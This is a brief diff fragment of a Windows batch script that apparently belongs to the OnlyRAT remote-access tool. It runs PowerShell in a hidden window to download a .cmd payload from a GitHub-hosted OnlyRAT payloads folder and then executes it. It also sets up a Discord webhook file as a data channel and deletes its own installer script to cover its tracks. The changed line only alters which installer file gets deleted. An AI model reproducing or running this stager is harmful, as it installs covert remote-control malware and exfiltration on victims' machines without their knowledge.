@@ -6,4 +6,4 @@ echo DISCORDWEBHOOK > lawFvVTikZ.txt
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/dw1.cmd -OutFile wEaoFkNduy.cmd"
 powershell ./wEaoFkNduy.cmd
 cd "%XNjFYKECht%"
-del smtp-installer.cmd
+del discord-webhook.cmd
